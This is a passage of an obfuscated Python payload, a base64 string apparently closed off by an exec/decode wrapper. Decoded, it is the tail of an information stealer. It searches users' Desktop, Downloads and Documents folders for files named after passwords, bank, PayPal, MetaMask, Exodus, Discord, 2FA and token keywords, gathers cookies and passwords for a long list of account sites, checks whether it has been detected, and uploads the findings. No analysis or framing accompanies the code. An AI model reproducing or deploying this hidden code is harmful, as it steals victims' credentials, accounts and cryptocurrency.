tcC5zcGxpdCgiXEFwcERhdGEiKVswXQogICAgcGF0aDJzZWFyY2ggPSBbCiAgICAgICAgdXNlciArICIvRGVza3RvcCIsCiAgICAgICAgdXNlciArICIvRG93bmxvYWRzIiwKICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiCiAgICBdCgogICAga2V5X3dvcmRzRm9sZGVyID0gWwogICAgICAgICJhY2NvdW50IiwKICAgICAgICAiYWNvdW50IiwKICAgICAgICAicGFzc3ciLAogICAgICAgICJzZWNyZXQiCgogICAgXQoKICAgIGtleV93b3Jkc0ZpbGVzID0gWwogICAgICAgICJwYXNzdyIsCiAgICAgICAgIm1kcCIsCiAgICAgICAgIm1vdGRlcGFzc2UiLAogICAgICAgICJtb3RfZGVfcGFzc2UiLAogICAgICAgICJsb2dpbiIsCiAgICAgICAgInNlY3JldCIsCiAgICAgICAgImFjY291bnQiLAogICAgICAgICJhY291bnQiLAogICAgICAgICJwYXlwYWwiLAogICAgICAgICJiYW5xdWUiLAogICAgICAgICJhY2NvdW50IiwKICAgICAgICAibWV0YW1hc2siLAogICAgICAgICJ3YWxsZXQiLAogICAgICAgICJjcnlwdG8iLAogICAgICAgICJleG9kdXMiLAogICAgICAgICJkaXNjb3JkIiwKICAgICAgICAiMmZhIiwKICAgICAgICAiY29kZSIsCiAgICAgICAgIm1lbW8iLAogICAgICAgICJjb21wdGUiLAogICAgICAgICJ0b2tlbiIsCiAgICAgICAgImJhY2t1cCIsCiAgICAgICAgInNlY3JldCIKICAgICAgICBdCgogICAgd2lraXRoID0gW10KICAgIGZvciBwYXR0IGluIHBhdGgyc2VhcmNoOiAKICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpCiAgICAgICAgd2lraXRoLmFwcGVuZChraXdpKQogICAgcmV0dXJuIHdpa2l0aAoKCmdsb2JhbCBrZXl3b3JkLCBjb29raVdvcmRzLCBwYXN3V29yZHMsIENvb2tpQ291bnQsIFBhc3N3Q291bnQsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKCmtleXdvcmQgPSBbCiAgICAnbWFpbCcsICdbY29pbmJhc2VdKGh0dHBzOi8vY29pbmJhc2UuY29tKScsICdbc2VsbGl4XShodHRwczovL3NlbGxpeC5pbyknLCAnW2dtYWlsXShodHRwczovL2dtYWlsLmNvbSknLCAnW3N0ZWFtXShodHRwczovL3N0ZWFtLmNvbSknLCAnW2Rpc2NvcmRdKGh0dHBzOi8vZGlzY29yZC5jb20pJywgJ1tyaW90Z2FtZXNdKGh0dHBzOi8vcmlvdGdhbWVzLmNvbSknLCAnW3lvdXR1YmVdKGh0dHBzOi8veW91dHViZS5jb20pJywgJ1tpbnN0YWdyYW1dKGh0dHBzOi8vaW5zdGFncmFtLmNvbSknLCAnW3Rpa3Rva10oaHR0cHM6Ly90aWt0b2suY29tKScsICdbdHdpdHRlcl0oaHR0cHM6Ly90d2l0dGVyLmNvbSknLCAnW2ZhY2Vib29rXShodHRwczovL2ZhY2Vib29rLmNvbSknLCAnY2FyZCcsICdbZXBpY2dhbWVzXShodHRwczovL2VwaWNnYW1lcy5jb20pJywgJ1tzcG90aWZ5XShodHRwczovL3Nwb3RpZnkuY29tKScsICdbeWFob29dKGh0dHBzOi8veWFob28uY29tKScsICdbcm9ibG94XShodHRwczovL3JvYmxveC5jb20pJywgJ1t0d2l0Y2hdKGh0dHBzOi8vdHdpdGNoLmNvbSknLCAnW21pbmVjcmFmdF0oaHR0cHM6Ly9taW5lY3JhZnQubmV0KScsICdiYW5rJywgJ1twYXlwYWxdKGh0dHBzOi8vcGF5cGFsLmNvbSknLCAnW29yaWdpbl0oaHR0cHM6Ly9vcmlnaW4uY29tKScsICdbYW1hem9uXShodHRwczovL2FtYXpvbi5jb20pJywgJ1tlYmF5XShodHRwczovL2ViYXkuY29tKScsICdbYWxpZXhwcmVzc10oaHR0cHM6Ly9hbGlleHByZXNzLmNvbSknLCAnW3BsYXlzdGF0aW9uXShodHRwczovL3BsYXlzdGF0aW9uLmNvbSknLCAnW2hib10oaHR0cHM6Ly9oYm8uY29tKScsICdbeGJveF0oaHR0cHM6Ly94Ym94LmNvbSknLCAnYnV5JywgJ3NlbGwnLCAnW2JpbmFuY2VdKGh0dHBzOi8vYmluYW5jZS5jb20pJywgJ1tob3RtYWlsXShodHRwczovL2hvdG1haWwuY29tKScsICdbb3V0bG9va10oaHR0cHM6Ly9vdXRsb29rLmNvbSknLCAnW2NydW5jaHlyb2xsXShodHRwczovL2NydW5jaHlyb2xsLmNvbSknLCAnW3RlbGVncmFtXShodHRwczovL3RlbGVncmFtLmNvbSknLCAnW3Bvcm5odWJdKGh0dHBzOi8vcG9ybmh1Yi5jb20pJywgJ1tkaXNuZXldKGh0dHBzOi8vZGlzbmV5LmNvbSknLCAnW2V4cHJlc3N2cG5dKGh0dHBzOi8vZXhwcmVzc3Zwbi5jb20pJywgJ2NyeXB0bycsICdbdWJlcl0oaHR0cHM6Ly91YmVyLmNvbSknLCAnW25ldGZsaXhdKGh0dHBzOi8vbmV0ZmxpeC5jb20pJwpdCgpDb29raUNvdW50LCBQYXNzd0NvdW50ID0gMCwgMApjb29raVdvcmRzID0gW10KcGFzd1dvcmRzID0gW10KCldhbGxldHNaaXAgPSBbXSAjIFtOYW1lLCBMaW5rXQpHYW1pbmdaaXAgPSBbXQpPdGhlclppcCA9IFtdCgpHYXRoZXJBbGwoKQpERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpCiMgREVURUNURUQgPSBGYWxzZQppZiBub3QgREVURUNURUQ6CiAgICB3aWtpdGggPSBLaXdpKCkKCiAgICBmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQogICAgdGltZS5zbGVlcCgwLjIpCgogICAgZmlsZXRleHQgPSAiXG4iCiAgICBmb3IgYXJnIGluIEtpd2lGaWxlczoKICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOgogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQogICAgICAgICAgICBmb2xkbGlzdCA9IGFyZ1syXSAgICAgICAKICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLwn5OBIHtmb2xkcGF0aH1cbiIKCiAgICAgICAgICAgIGZvciBmZmlsIGluIGZvbGRsaXN0OgogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQogICAgICAgICAgICAgICAgZmlsZWFubWUgPSBhW2xlbihhKS0xXQogICAgICAgICAgICAgICAgYiA9IGZmaWxbMV0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4pSU4pSAOm9wZW5fZmlsZV9mb2xkZXI6IFt7ZmlsZWFubWV9XSh7Yn0pXG4iCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9ICJcbiIKICAgIHVwbG9hZCgia2l3aSIsIGZpbGV0ZXh0KQo=
"""))